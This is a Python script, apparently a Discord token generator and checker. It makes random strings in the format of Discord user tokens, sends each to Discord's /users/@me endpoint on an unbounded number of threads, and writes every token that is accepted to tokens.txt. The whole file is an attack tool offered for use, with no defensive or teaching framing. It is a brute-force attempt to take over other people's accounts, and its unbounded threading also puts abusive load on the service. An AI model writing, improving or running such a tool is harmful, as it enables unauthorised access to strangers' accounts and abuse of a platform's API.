import requests
import threading
import base64
import random
import string
import re
import sys
from colorama import init, Fore

init()

threads = []
good = []

def register_token(token):
    good.append(token)
    with open("tokens.txt", 'a+') as f:
        f.write(token + '\n')
    print(Fore.GREEN + token)

def check_token(token):
    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
        for t in re.findall(regex, token):
            url = "https://discord.com/api/v9/users/@me"
            data = {
                "Authorization": t
            }
            r = requests.get(url, headers=data)
            if int(r.status_code) == 200:
                register_token(t)


def generate_tokens(quantity):
    while len(good) < quantity:
        part1 = base64.b64encode(''.join((random.choice(string.digits)) for _ in range(18)).encode()).decode()
        part2 = ''.join((random.choice(string.ascii_letters + string.digits)) for _ in range(6))
        part3 = ''.join((random.choice(string.ascii_letters + string.digits + '_-')) for _ in range(27))
        token = part1 + '.' + part2 + '.' + part3
        th1 = threading.Thread(target=check_token, args=(token,))
        threads.append(th1)
        th1.start()

    while True:
        for th in threads:
            if th.is_alive():
                pass
            else:
                threads.remove(th)
        if len(threads) == 0:
            break


if __name__ == "__main__":
    args = sys.argv
    if len(args) > 1:
        try:
            quantity = int(args[1])
            generate_tokens(quantity)
        except ValueError:
            print("Please provide a valid quantity")
    else:
        print("Please provide a number of tokens you want")
